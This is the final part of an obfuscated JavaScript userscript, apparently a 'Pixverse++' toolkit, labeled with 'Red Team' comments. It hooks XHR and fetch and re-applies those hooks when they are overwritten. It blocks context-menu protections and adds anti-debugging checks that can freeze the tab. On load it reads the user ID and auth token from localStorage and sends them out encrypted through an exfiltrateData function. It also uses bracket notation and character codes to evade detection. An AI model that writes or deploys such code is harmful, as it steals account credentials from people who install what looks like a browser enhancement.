      if (myCustomXhrOpen && window['XMLHttpRequest']['prototype']['open']['toString']() !== myCustomXhrOpen['toString']()) {
        log('XHR hook detected as overwritten, re-applying...');
        overrideXHR(); // Reapply the hook
      }
      if (myCustomFetch && window['fetch']['toString']() !== myCustomFetch['toString']()) {
        log('Fetch hook detected as overwritten, re-applying...');
        overrideFetch(); // Reapply the hook
      }
    }, 5000 + window['Math']['random']() * 1000); // Add jitter to self-healing interval too
    log('Self-healing hooks initialized');
  }

  /**
   * Displays a transient toast notification at the bottom center of the screen.
   * Only displays if DEBUG_MODE is true.
   * @param {string} msg - The message to display in the toast.
   * @param {number} [duration=3500] - Duration in milliseconds before the toast starts to fade out.
   */
  function showToast(msg, duration = 3500) {
    if (!DEBUG_MODE) return; // Do not show toast in stealth mode.

    // Red Team: Indirect querySelectorAll, remove access.
    // Remove any existing toasts to ensure only one is visible at a time.
    window['document']['querySelectorAll'](".pv-toast").forEach(e => e['remove']());

    // Red Team: Indirect createElement access.
    const el = window['document']['createElement']("div");
    // Red Team: Obfuscate class name.
    el['className'] = [112, 118, 45, 116, 111, 97, 115, 116].map(c => String.fromCharCode(c)).join(''); // "pv-toast"
    el['textContent'] = msg;

    // Apply inline styles for the toast's appearance and positioning.
    // Red Team: Indirect Object.assign, style.opacity access.
    window['Object']['assign'](el['style'], {
      position: "fixed",
      bottom: "22px",
      left: "50%",
      transform: "translateX(-50%)",
      background: "rgba(20,40,48,0.94)",
      color: "#15FFFF",
      padding: "8px 20px",
      borderRadius: "6px",
      font: "15px/1.2 sans-serif",
      zIndex: "299999", // High z-index to ensure it's on top of other content.
      opacity: "0",
      transition: "opacity .25s ease-in-out", // Smooth fade in/out transition.
      pointerEvents: "none" // Allows clicks to pass through the toast to elements beneath it.
    });

    // Red Team: Indirect appendChild access.
    window['document']['body']['appendChild'](el);

    // Trigger fade-in animation using requestAnimationFrame for smooth rendering.
    // Red Team: Indirect requestAnimationFrame access.
    window['requestAnimationFrame'](() => el['style']['opacity'] = "1");

    // Schedule fade-out and removal after the specified duration.
    // Red Team: Indirect setTimeout, addEventListener, remove access.
    window['setTimeout'](() => {
      el['style']['opacity'] = "0";
      // Remove the element from DOM after the fade-out transition completes.
      el['addEventListener']("transitionend", () => el['remove'](), { once: true });
    }, duration);
  }

  /**
   * Overrides context menu blocking mechanisms on the page.
   * It intercepts `addEventListener` calls to block `contextmenu` events
   * and uses a `MutationObserver` to remove `oncontextmenu` attributes from elements.
   */
  function overrideContextMenuBlockers() {
    // Override EventTarget.prototype.addEventListener to prevent new 'contextmenu' listeners from being added.
    // Red Team: Indirect EventTarget.prototype.addEventListener, apply access.
    window['EventTarget']['prototype']['addEventListener'] = function(type, handler, options) {
      if (type === "contextmenu") {
        return; // Block the addition of contextmenu event listeners.
      }
      return originalAddEventListener['apply'](this, arguments);
    };

    // Use a MutationObserver to remove 'oncontextmenu' attributes from elements
    // that are dynamically added to the DOM.
    // Red Team: Indirect MutationObserver, forEach, hasAttribute, removeAttribute, querySelectorAll, observe access.
    new (window['MutationObserver'])(mutations => {
      mutations['forEach'](mutation => mutation['addedNodes']['forEach'](node => {
        if (node['nodeType'] === 1) { // Check if the added node is an Element.
          if (node['hasAttribute']("oncontextmenu")) {
            node['removeAttribute']("oncontextmenu");
          }
          // Also check all descendants of the added node for 'oncontextmenu' attributes.
          node['querySelectorAll']("[oncontextmenu]")['forEach'](element => element['removeAttribute']("oncontextmenu"));
        }
      }));
    })['observe'](window['document']['documentElement'], { childList: true, subtree: true }); // Observe the entire document for added nodes.

    // Remove 'oncontextmenu' attributes from any elements already present in the DOM on initial load.
    // Red Team: Indirect document.querySelectorAll, forEach, removeAttribute access.
    window['document']['querySelectorAll']("[oncontextmenu]")['forEach'](element => element['removeAttribute']("oncontextmenu"));
    log('Anti-contextmenu enabled');
  }

  /**
   * Red Team: Anti-debugging check.
   * Attempts to detect if DevTools is open by checking console properties and timing.
   * This is a simple check and can be bypassed, but adds a layer of defense.
   * For a real red team op, this might trigger C2 beaconing, self-destruction, or
   * more aggressive anti-analysis techniques (e.g., infinite loops, crashing the tab).
   */
  function antiDebugCheck() {
    // Red Team: Anti-debug is active only if DEBUG_MODE is false AND ENABLE_ANTI_DEBUG is true.
    if (!DEBUG_MODE && ENABLE_ANTI_DEBUG) {
      let check = () => {
        try {
          // This technique attempts to detect DevTools by overriding a function's toString
          // and checking if it's called rapidly, which happens when DevTools tries to inspect it.
          // Red Team: Indirect Function.prototype.toString, performance.now access.
          (function() {}.constructor['prototype']['toString'] = function() {
            // If this function is called too frequently, it suggests DevTools is open.
            if (window['performance']['now']() - check.lastCheck < 100) {
              // Trigger a log or a more disruptive action.
              window['console']['log']('%cDEBUGGER DETECTED!', 'font-size: 50px; color: red;');
              // For lab exercises, uncomment the following for more aggressive anti-debugging:
              // debugger; // Forces a breakpoint
              // while(true); // Causes an infinite loop, freezing the tab
            }
            check.lastCheck = window['performance']['now']();
            return 'function() {}'; // Return a benign string to avoid suspicion.
          });
        } catch (e) {
          // If the above fails (e.g., strict mode, CSP), try another method.
          // Check if the console is open by comparing window dimensions.
          const threshold = 160; // Typical height/width difference when DevTools is open.
          // Red Team: Indirect outerWidth/innerWidth/outerHeight/innerHeight access.
          if (window['outerWidth'] - window['innerWidth'] > threshold ||
              window['outerHeight'] - window['innerHeight'] > threshold) {
            window['console']['log']('%cDEBUGGER DETECTED (DIMENSIONS)!', 'font-size: 50px; color: red;');
            // For lab exercises, uncomment the following for more aggressive anti-debugging:
            // debugger;
          }
        }
      };
      check.lastCheck = window['performance']['now']();
      // Periodically run the check with random jitter for stealth.
      // Red Team: Indirect setInterval, Math.random access.
      window['setInterval'](check, 1000 + window['Math']['random']() * 500);
    }
  }

  /**
   * Initializes the toolkit by applying all necessary overrides and setting up features.
   * Ensures that initialization happens only once.
   */
  function initialize() {
    if (isInitialized) {
      return; // Prevent re-initialization.
    }
    try {
      antiDebugCheck(); // Red Team: Call anti-debugging, which will self-check ENABLE_ANTI_DEBUG & DEBUG_MODE.
      overrideContextMenuBlockers();
      overrideXHR();
      overrideFetch();
      setupWatermarkButton();
      setupSelfHealingHooks(); // Enable self-healing for network hooks

      // Red Team: Read from local storage and exfiltrate data on initialization.
      // Data is exfiltrated with encryption.
      try {
        // Red Team: Indirect localStorage.getItem access, using obfuscated keys.
        const userId = window['localStorage']['getItem'](LOCAL_STORAGE_KEYS.userId);
        if (userId) {
          log('Found potential user ID in local storage:', userId);
          exfiltrateData("local_storage_user_id", userId, true); // Red Team: Encrypt exfiltrated data.
        }
        const token = window['localStorage']['getItem'](LOCAL_STORAGE_KEYS.authToken);
        if (token) {
          log('Found potential auth token in local storage:', token);
          exfiltrateData("local_storage_auth_token", token, true); // Red Team: Encrypt exfiltrated data.
        }
      } catch (e) {
        error("Error accessing local storage during initialization:", e);
      }

      isInitialized = true;
      log('Pixverse++ initialized'); // Will only log in DEBUG_MODE
      showToast('Pixverse++ Toolkit loaded ✓'); // Will only show in DEBUG_MODE
    } catch (e) {
      error('Initialization failed', e); // Will only log in DEBUG_MODE
      showToast('Pixverse++ init error'); // Will only show in DEBUG_MODE
    }
  }

  // Determine when to initialize the script.
  // @run-at document-start ensures the script runs as early as possible.
  // If the document is still loading, wait for DOMContentLoaded to ensure basic DOM is ready.
  // Otherwise, if the document is already interactive/complete, initialize immediately.
  // Red Team: Indirect document.readyState, addEventListener access.
  if (window['document']['readyState'] === 'loading') {
    window['document']['addEventListener']('DOMContentLoaded', initialize, { once: true });
  } else {
    initialize();
  }

  // Immediately-invoked function to inject minimal CSS for the toast notification.
  // This ensures the CSS is present as soon as possible, BUT ONLY IF DEBUG_MODE is true.
  (function() {
    if (!DEBUG_MODE) return; // Do not inject toast CSS in stealth mode.
    // Red Team: Obfuscate CSS ID and class names.
    const styleId = [112, 118, 45, 116, 111, 97, 115, 116, 45, 99, 115, 115].map(c => String.fromCharCode(c)).join(''); // "pv-toast-css"
    // Red Team: Indirect document.getElementById access.
    if (window['document']['getElementById'](styleId)) {
      return; // Prevent re-injection of the CSS if already present.
    }
    // Red Team: Indirect createElement, appendChild access.
    const styleElement = window['document']['createElement']("style");
    styleElement['id'] = styleId;
    styleElement['textContent'] = `.${[112, 118, 45, 116, 111, 97, 115, 116].map(c => String.fromCharCode(c)).join('')}{box-sizing:border-box;user-select:none;pointer-events:none;}`; // ".pv-toast"
    window['document']['head']['appendChild'](styleElement);
  })();

})();
